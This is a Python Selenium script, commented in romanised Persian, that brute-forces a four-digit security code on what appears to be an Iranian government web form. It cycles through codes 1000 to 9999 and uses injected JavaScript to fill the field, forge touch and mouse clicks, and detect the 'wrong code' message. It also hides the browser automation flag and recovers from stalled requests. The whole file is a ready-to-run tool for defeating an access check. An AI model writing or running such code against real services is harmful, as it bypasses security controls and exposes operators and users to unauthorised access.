"""
code_try.py
============
Halghe-ye BRUTE-FORCE-e kod-e amniati-ye 4-raqami (1000..9999) — MOSTAGHEL (standalone).

In file az `gomrok.py` bricone keshide shode ta betavan an-ra be onvane yek
PROJE-ye joda estefade/tose'e daad. Kar-e asli:
    - kod-ha-ra be tartib (1000, 1001, ..., 9999) dar field-e kod migozarad,
    - dokme-ye 'edame' (AJAX) ra mizanad,
    - natije-ra SARI' poll mikonad:
        * agar payam-e "kod ghalat" amad  -> kod-e ba'di.
        * agar dokme napadid shod / feedback-e movaffaghiat neshast -> DOROST, tavaghof.
    - agar loader (AJAX) GIR kard -> refresh + hamin kod dobare (ta az dast naravad).

------------------------------------------------------------------------------
HAME-ye moteghayer-haye GHABEL-e TAGHYIR dar bakhsh-e `CONFIG` (payin) jam' shode:
    - nahve-ye YAFTAN-e element-ha (wicketpath / id / css / xpath ...)   -> `SELECTORS`
    - baze-ye kod (start/end) va tedad-e raqam                            -> `CODE_START`, ...
    - matn-e khata-ye "kod ghalat"                                        -> `BAD_MSG`
    - timing-ha (poll, timeout, ...)                                      -> `Timing`
    - tanzimat-e driver (mobile-emulation ...)                            -> `make_driver()`
faghat inja avaz kon, badi-ye code dast NAKHORAD.

Estefade:
    # 1) rahat-tarin: khod-e file driver misaze va URL-ra baz mikonad
    python code_try.py --url "https://.../safhe-ye-kod-e-amniati"

    # 2) ya dar code-e khodet, roo-ye yek driver-e amade:
    from code_try import brute_force_security_code
    found = brute_force_security_code(driver, start=1000, end=9999)
------------------------------------------------------------------------------
"""
import argparse
import time
from collections import deque

from selenium.webdriver.common.by import By


# =============================================================================
#  CONFIG  —  HAR CHI momken ast avaz shavad INJAST. faghat inja dast bezan.
# =============================================================================

# --- 1) NAHVE-ye YAFTAN-e ELEMENT-HA -----------------------------------------
# har element ba yek (By, value) moshakhas mishavad. agar site avaz shod va
# masalan digar wicketpath nadasht, faghat 'by' va 'value'-ra inja avaz kon
# (mesl-e By.ID / By.CSS_SELECTOR / By.XPATH ...). code-e paydar taghyir NEMIKHAHAD.
#
# fe'lan hame ba attribute-e `wicketpath` (site-e Wicket) peyda mishavand.
def _wp(path):
    """selector-e kotah baraye element-haye Wicket ba attribute-e wicketpath."""
    return (By.CSS_SELECTOR, f'[wicketpath="{path}"]')


class SELECTORS:
    # field-e matni-ye kod-e amniati (jayi ke kod-e 4-raqami neveshte mishavad)
    CHECK_FIELD = _wp("form_stepsOrInfoPanel_form_securityCodeStep_checkField")
    # checkbox-e "taahhod ..." (bayad YEK BAR tik bokhorad ta site kod-ra check konad)
    CONFIRM_CHECK = _wp(
        "form_stepsOrInfoPanel_form_securityCodeStep_confirmCheckContainer_confirmCheck"
    )
    # dokme-ye 'edame' (AjaxButton — safhe reload NEMISHAVAD)
    END_BUTTON = _wp("form_stepsOrInfoPanel_form_securityCodeStep_end")
    # panel-e khata-ye hamin marhale (baraye pak-kardan-e khata-ye ghabli)
    ERROR_PANEL = _wp("form_stepsOrInfoPanel_form_securityCodeStep_errorPanel")


# --- 2) BAZE-ye KOD ----------------------------------------------------------
CODE_START = 1000     # kod HAMISHE 4-raqam ast va az 1000 shoru mishavad
CODE_END = 9999       # ta 9999
CODE_WIDTH = 4        # ba sefr-e ebtedaee: f"{code:0{CODE_WIDTH}d}"  -> 0042, 0400, ...


# --- 3) MATN-e KHATA ---------------------------------------------------------
# matni ke site vaghti kod GHALAT ast neshan midahad (baraye tashkhis-e "boro ba'di").
BAD_MSG = "کد امنیتی صحیح نمی باشد"


# --- 4) TIMING-ha (saniye) ---------------------------------------------------
class Timing:
    WAIT_FIELD = 20.0     # sabr-e avvaliye ta field-e kod dar safhe zaher shavad
    POLL_STEP = 0.03      # fasele-ye har poll-e natije (~30ms)
    POLL_DEADLINE = 6.0   # hداكثر sabr baraye javab-e YEK kod
    POLL_TAIL = 0.15      # forsat-e akhar ta payam beneshinad ba'd az busy-shodan
    BUSY_WAIT = 15.0      # sabr ta AJAX-e ghabli tamam shavad
    BUSY_WAIT_STUCK = 20.0   # sabr-e biشtar vaghti loader GIR karde
    STUCK_AFTER = 4.0     # agar bishtar az in busy mand -> ENTER-e refresh
    RECHECK_CONFIRM_EVERY = 200  # har chand kod tik-e taahhod-ra dobare check konim
    MAX_RETRY_PER_CODE = 3   # har kod ke loader-esh GIR kard, chand bar retry shavad


# =============================================================================
#  JS SNIPPETS  —  mama'ulan dast NEMIKHorand (jozئiat-e mobile/AJAX).
# =============================================================================

# por-kardan-e field + click-e 'end' — HAME dar YEK execute_script (kamtarin latency).
_FIRE_JS = r"""
  var codeSel = arguments[0], endSel = arguments[1];
  var f = document.querySelector(codeSel);
  var b = document.querySelector(endSel);
  if(!f || !b) return false;
  f.value = arguments[2];
  f.dispatchEvent(new Event('input',{bubbles:true}));
  f.dispatchEvent(new Event('change',{bubbles:true}));
  var r = b.getBoundingClientRect();
  var cx = r.left + r.width/2, cy = r.top + r.height/2;
  function ev(type, C){ var e = new C(type, {bubbles:true, cancelable:true,
    clientX:cx, clientY:cy, view:window}); b.dispatchEvent(e); }
  try{ var t=new Touch({identifier:1, target:b, clientX:cx, clientY:cy});
    b.dispatchEvent(new TouchEvent('touchstart',{bubbles:true,cancelable:true,
      touches:[t], targetTouches:[t], changedTouches:[t]}));
    b.dispatchEvent(new TouchEvent('touchend',{bubbles:true,cancelable:true,
      touches:[], targetTouches:[], changedTouches:[t]}));
  }catch(e){}
  try{ ev('pointerdown', PointerEvent); ev('pointerup', PointerEvent); }catch(e){}
  ev('mousedown', MouseEvent); ev('mouseup', MouseEvent); ev('click', MouseEvent);
  return true;
"""

# pak-kardan-e khata-ye ghabli az DOM (ta ba khata-ye kohne eshtebah nagirim).
_CLEAR_ERR_JS = r"""
  var errSel = arguments[0];
  var p = document.querySelector(errSel);
  if(p) p.innerHTML = '';
  document.querySelectorAll(
    '[wicketpath$="feedBack_container_error"] .feedbackPanel, '+
    '[wicketpath$="feedBack_container_error"] ul').forEach(function(e){
      e.parentNode && e.parentNode.removeChild(e);});
  return true;
"""

# khandan-e natije: {v:0/1/2, other:''}
#   v=0 -> hanooz hich | v=1 -> GHALAT | v=2 -> DOROST
#   other -> matn-e HAR khata-ye DIGAR (baraye log)
_POLL_JS = r"""
  var endSel = arguments[0], badMsg = arguments[1];
  var out = {v:0, other:''};
  var msgs = document.querySelectorAll(
    '[wicketpath$="feedBack_container_error"] li, '+
    '[wicketpath$="feedBack_container_error"] span[wicketpath$="_message"], '+
    '[wicketpath$="securityCodeStep_errorPanel"]');
  var badSeen = false;
  for(var i=0;i<msgs.length;i++){
    var t=(msgs[i].innerText||'').trim();
    if(!t) continue;
    if(t.indexOf(badMsg)>=0){ badSeen = true; }
    else { out.other += (out.other?' | ':'') + t; }
  }
  if(badSeen){ out.v = 1; return out; }
  var b = document.querySelector(endSel);
  if(!b){ out.v = 2; return out; }
  var suc = document.querySelector(
    '[wicketpath$="feedBack_container_success"] li, '+
    '[wicketpath$="feedBack_container_success"] .feedbackPanel');
  if(suc && (suc.innerText||'').trim()){ out.v = 2; return out; }
  return out;
"""

# AJAX dar jaryan ast? (loader namayan YA dokme-ye 'end' disabled)
_BUSY_JS = r"""
  var endSel = arguments[0];
  var b = document.querySelector(endSel);
  if(b && (b.disabled || (' '+(b.className||'')+' ').indexOf(' disabled ')>=0))
    return true;
  var ind = document.querySelectorAll(
    '.wicket-ajax-indicator, [wicketpath$="indicator_indicatorImg"]');
  for(var j=0;j<ind.length;j++){ if(ind[j].offsetParent !== null) return true; }
  return false;
"""

# agar loader GIR kard: dar field-e kod ENTER mizanim -> safhe refresh + loader miravad.
_ENTER_JS = r"""
  var codeSel = arguments[0];
  var f = document.querySelector(codeSel);
  if(!f) return false;
  f.focus();
  var opts = {bubbles:true, cancelable:true, key:'Enter', code:'Enter',
              keyCode:13, which:13, view:window};
  f.dispatchEvent(new KeyboardEvent('keydown', opts));
  f.dispatchEvent(new KeyboardEvent('keypress', opts));
  f.dispatchEvent(new KeyboardEvent('keyup', opts));
  return true;
"""

# zanjire-ye touch/pointer/mouse baraye TIK-zadan-e checkbox-e Wicket (halat-e mobile).
_CHAIN_JS = r"""
  var b = arguments[0];
  var r = b.getBoundingClientRect();
  var cx = r.left + r.width/2, cy = r.top + r.height/2;
  function ev(type, C){ var e = new C(type, {bubbles:true,
    cancelable:true, clientX:cx, clientY:cy, view:window});
    b.dispatchEvent(e); }
  try{ var t=new Touch({identifier:1, target:b, clientX:cx, clientY:cy});
    b.dispatchEvent(new TouchEvent('touchstart',{bubbles:true,
      cancelable:true, touches:[t], targetTouches:[t], changedTouches:[t]}));
    b.dispatchEvent(new TouchEvent('touchend',{bubbles:true,
      cancelable:true, touches:[], targetTouches:[], changedTouches:[t]}));
  }catch(e){}
  try{ ev('pointerdown', PointerEvent); ev('pointerup', PointerEvent); }catch(e){}
  ev('mousedown', MouseEvent); ev('mouseup', MouseEvent); ev('click', MouseEvent);
"""


# =============================================================================
#  HELPERS
# =============================================================================
def _css(selector):
    """(By, value) -> string-e CSS baraye document.querySelector dakhel-e JS.
    faghat baraye By.CSS_SELECTOR kar mikonad (JS-ha ba querySelector kar mikonand)."""
    by, value = selector
    if by != By.CSS_SELECTOR:
        raise ValueError(
            f"JS-e in file ba querySelector kar mikonad, pas SELECTORS bayad "
            f"By.CSS_SELECTOR bashad (na {by!r}). agar mikhahi XPath/ID bezari, "
            f"selector-ha-ra be CSS tabdil kon."
        )
    return value


def find(driver, selector):
    """element-ra ba (By, value) peyda mikonad. ag4r nabود exception midahad."""
    by, value = selector
    return driver.find_element(by, value)


def find_all(driver, selector):
    """hame-ye element-haye motabegh (list) — agar nabود list-e khali."""
    by, value = selector
    return driver.find_elements(by, value)


def ensure_checked_touch(driver, el, tries=6):
    """Checkbox-e Wicket-ra dar halat-e MOBILE tik mizanad.
    .click()-e adi roo-ye in checkbox-ha (halat-e mobile) javab NEMIDAHAD, pas
    zanjire-ye kamel-e touch/pointer/mouse-ra dispatch mikonim va dar akhar
    checked-ra mostaghim set mikonim. Barmigardanad True agar tik khorde bashad."""
    for _ in range(tries):
        try:
            if el.is_selected():
                return True
        except Exception:
            pass
        try:
            driver.execute_script("arguments[0].scrollIntoView({block:'center'});", el)
        except Exception:
            pass
        # zanjire roo-ye khod-e input
        try:
            driver.execute_script(_CHAIN_JS, el)
        except Exception:
            pass
        # va roo-ye .row-e valedeyn (nahiye-ye vaghe'i-ye click-e clip-check)
        try:
            parent = driver.execute_script(
                "return arguments[0].closest('.row')||arguments[0].parentElement;", el)
            if parent:
                driver.execute_script(_CHAIN_JS, parent)
        except Exception:
            pass
        # dar akhar mostaghim checked-ra set kon + event-e change
        try:
            driver.execute_script(
                "arguments[0].checked = true;"
                "arguments[0].dispatchEvent(new Event('click',{bubbles:true}));"
                "arguments[0].dispatchEvent(new Event('change',{bubbles:true}));", el)
        except Exception:
            pass
        try:
            if el.is_selected():
                return True
        except Exception:
            pass
    try:
        return el.is_selected()
    except Exception:
        return False


# =============================================================================
#  HALGHE-ye ASLI
# =============================================================================
def brute_force_security_code(driver, start=CODE_START, end=CODE_END,
                              on_progress=None):
    """Kod-e amniati-ye 4-raqami (ke NEMIDANIM) ra BRUTE-FORCE mikonad.

    Args:
        driver: WebDriver-e amade (safhe rooye marhale-ye kod-e amniati bashad).
        start, end: baze-ye kod (pishfarz 1000..9999).
        on_progress: (optional) callback(n_tried, code_s, rate) — baraye namayesh.

    Barmigardanad:
        code_s (str, mesl-e "0421") agar peyda shod, vagarna None.
    """
    check_css = _css(SELECTORS.CHECK_FIELD)
    end_css = _css(SELECTORS.END_BUTTON)
    err_css = _css(SELECTORS.ERROR_PANEL)

    # 0) sabr ta field-e kod dar safhe biAyad
    deadline = time.time() + Timing.WAIT_FIELD
    while time.time() < deadline:
        if find_all(driver, SELECTORS.CHECK_FIELD):
            break
        time.sleep(0.2)
    else:
        print(">>> (checkField nayamad — safhe-ra check kon.)")
        return None

    print(f">>> BRUTE-FORCE-e kod-e amniati ({start}..{end}) shoru shod.")

    # 1) tik-e taahhod — YEK BAR (ba zanjire-ye touch, chon .click() kar nemikonad)
    checked_ok = False
    try:
        chk = find(driver, SELECTORS.CONFIRM_CHECK)
        checked_ok = ensure_checked_touch(driver, chk)
        print(f">>> tik-e taahhod zade shod (checked={checked_ok})")
    except Exception as e:
        print(f">>> HOSHDAR: tik-e taahhod zade nashod: {e}")

    if not checked_ok:
        for _ in range(3):
            time.sleep(0.4)
            try:
                chk = find(driver, SELECTORS.CONFIRM_CHECK)
                if ensure_checked_touch(driver, chk):
                    checked_ok = True
                    print(">>> tik-e taahhod dar talash-e dobare zade shod.")
                    break
            except Exception:
                pass
        if not checked_ok:
            print(">>> ⚠ HOSHDAR: checkbox-e taahhod TIK NAKHORD — "
                  "brute-force momken ast bi-natije bashad.")

    # busy? (AJAX dar jaryan)
    def _busy():
        try:
            return bool(driver.execute_script(_BUSY_JS, end_css))
        except Exception:
            return False

    # sabr ta busy nabashad; agar GIR kard -> ENTER-e refresh
    def _wait_not_busy(timeout, stuck_after=None):
        t_start = time.time()
        dl = t_start + timeout
        entered = False
        while time.time() < dl:
            if not _busy():
                return True
            if (stuck_after is not None and not entered
                    and (time.time() - t_start) > stuck_after):
                try:
                    driver.execute_script(_ENTER_JS, check_css)
                    print(">>> (loader GIR karde bود — ENTER dar field-e kod baraye "
                          "refresh zade shod.)")
                except Exception:
                    pass
                entered = True
            time.sleep(0.1)
        return not _busy()

    t0 = time.time()
    code_retries = {}                          # code_s -> tedad-e retry
    pending = deque(range(start, end + 1))     # sf-e kodha (kod-e GIR-karde te-ye sf barmigardad)
    n = -1

    while pending:
        code = pending.popleft()
        n += 1
        code_s = f"{code:0{CODE_WIDTH}d}"      # HAMISHE ba sefr-e ebtedaee: 0042, 0400 ...

        # 0) har N kod, motmaen sho tik-e taahhod HANOOZ hast (AJAX momken ast reset-esh konad)
        if n % Timing.RECHECK_CONFIRM_EVERY == 0:
            try:
                chk = find(driver, SELECTORS.CONFIRM_CHECK)
                if not chk.is_selected():
                    print(f">>> (tik-e taahhod baz nabود @ kod={code_s} — dobare mizanim.)")
                    ensure_checked_touch(driver, chk)
            except Exception:
                pass

        # 1) khata-ye ghabli-ra pak kon
        try:
            driver.execute_script(_CLEAR_ERR_JS, err_css)
        except Exception:
            pass

        # 1.5) sabr ta AJAX-e ghabli tamam shavad
        if _busy():
            _wait_not_busy(timeout=Timing.BUSY_WAIT, stuck_after=Timing.STUCK_AFTER)

        # 2+3) por kon + click (yekja)
        try:
            ok = driver.execute_script(_FIRE_JS, check_css, end_css, code_s)
            if not ok:
                if not find_all(driver, SELECTORS.END_BUTTON):
                    print(f">>> dokme-ye 'end' napadid shod (kod={code_s}) — ehtemalan raftim jelo!")
                    return code_s
                time.sleep(0.1)
                continue
        except Exception as e:
            print(f">>> (khata dar fire kod={code_s}: {e})")
            time.sleep(0.05)
            continue

        # 4) poll-e sari' ta natije
        res = {"v": 0, "other": ""}
        pdeadline = time.time() + Timing.POLL_DEADLINE
        while time.time() < pdeadline:
            time.sleep(Timing.POLL_STEP)
            try:
                res = driver.execute_script(_POLL_JS, end_css, BAD_MSG) or {"v": 0, "other": ""}
            except Exception:
                res = {"v": 0, "other": ""}
            if res.get("v"):
                break
            # javab nayamad va dige busy nist -> server javab-i nadad; biroon
            if not _busy():
                time.sleep(Timing.POLL_TAIL)
                try:
                    res = driver.execute_script(_POLL_JS, end_css, BAD_MSG) or {"v": 0, "other": ""}
                except Exception:
                    pass
                break

        verdict = res.get("v", 0)
        other = (res.get("other") or "").strip()
        if other:
            try:
                safe = other.encode("unicode_escape").decode("ascii")
            except Exception:
                safe = other
            print(f">>> ⚠ khata-ye DIGAR (gheyr az kod-e amniati) @ kod={code_s}: {safe}")

        # DOROST!
        if verdict == 2:
            dt = time.time() - t0
            print(f">>> ✅ KOD-e DOROST peyda shod: {code_s}  "
                  f"(ba'd az {n + 1} talash, {dt:.1f}s)")
            return code_s

        # GHALAT -> kod-e ba'di
        if verdict == 1:
            if (n + 1) % Timing.RECHECK_CONFIRM_EVERY == 0:
                dt = time.time() - t0
                rate = (n + 1) / dt if dt else 0
                print(f">>> ... {n + 1} kod emtehan shod ({code_s}), "
                      f"{rate:.1f} kod/s, separi: {dt:.0f}s")
                if on_progress:
                    try:
                        on_progress(n + 1, code_s, rate)
                    except Exception:
                        pass
            continue

        # verdict==0: javab nayamad
        if not find_all(driver, SELECTORS.END_BUTTON):
            print(f">>> dokme-ye 'end' napadid shod (kod={code_s}) — raftim jelo!")
            return code_s

        # loader GIR karde -> refresh + HAMIN kod-ra dobare (te-ye sf)
        if _busy():
            print(f">>> loader GIR karde (kod={code_s}) — sabr + refresh, ba'd HAMIN "
                  f"kod dobare zade mishavad ...")
            _wait_not_busy(timeout=Timing.BUSY_WAIT_STUCK, stuck_after=Timing.STUCK_AFTER)
            try:
                chk = find(driver, SELECTORS.CONFIRM_CHECK)
                if not chk.is_selected():
                    ensure_checked_touch(driver, chk)
            except Exception:
                pass
            retries = code_retries.get(code_s, 0)
            if retries < Timing.MAX_RETRY_PER_CODE:
                code_retries[code_s] = retries + 1
                pending.append(code)   # te-ye sf begozar ta az dast naravad

    print(f">>> ⚠ Hame-ye {end - start + 1} kod emtehan shod, hich-kodam dorost nabود.")
    return None


# =============================================================================
#  DRIVER  —  tanzimat (mobile-emulation). agar chize digari mikhahi, inja avaz kon.
# =============================================================================
def make_driver(headless=False, mobile=True):
    """Yek Chrome driver-e sade misAzad. `ensure_checked_touch` be halat-e MOBILE
    (touch events) niaz darad, pas pishfarz mobile-emulation roshan ast."""
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options

    opts = Options()
    if headless:
        opts.add_argument("--headless=new")
    opts.add_argument("--disable-blink-features=AutomationControlled")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    if mobile:
        # emulation-e mobile ta TouchEvent-ha dar site-e Wicket kar konand
        opts.add_experimental_option("mobileEmulation", {
            "deviceMetrics": {"width": 412, "height": 915, "pixelRatio": 2.625},
            "userAgent": ("Mozilla/5.0 (Linux; Android 12; Pixel 6) "
                          "AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/120.0.0.0 Mobile Safari/537.36"),
        })
    return webdriver.Chrome(options=opts)


def main():
    parser = argparse.ArgumentParser(
        description="Brute-force-e kod-e amniati-ye 4-raqami (1000..9999).")
    parser.add_argument("--url", help="URL-e safhe-ye kod-e amniati (agar bedi, driver misAzad).")
    parser.add_argument("--start", type=int, default=CODE_START, help="kod-e shoru (pishfarz 1000).")
    parser.add_argument("--end", type=int, default=CODE_END, help="kod-e payan (pishfarz 9999).")
    parser.add_argument("--headless", action="store_true", help="Chrome-e bدون panjere.")
    parser.add_argument("--no-mobile", action="store_true", help="mobile-emulation-ra khamush kon.")
    args = parser.parse_args()

    if not args.url:
        print("HOSHDAR: --url nadadi. bدون URL, in file faghat ke onvane MODUL "
              "estefade mishavad:\n"
              "    from code_try import brute_force_security_code\n"
              "    found = brute_force_security_code(driver)")
        return

    driver = make_driver(headless=args.headless, mobile=not args.no_mobile)
    try:
        driver.get(args.url)
        found = brute_force_security_code(driver, start=args.start, end=args.end)
        if found:
            print(f"\n=== KOD-e DOROST: {found} ===")
        else:
            print("\n=== hich kod-i dorost nabود. ===")
        # panjere baz mimAnad ta karbar natije-ra bebinad
        input("Enter bezan baraye baste-shodan-e browser ...")
    finally:
        try:
            driver.quit()
        except Exception:
            pass


if __name__ == "__main__":
    main()
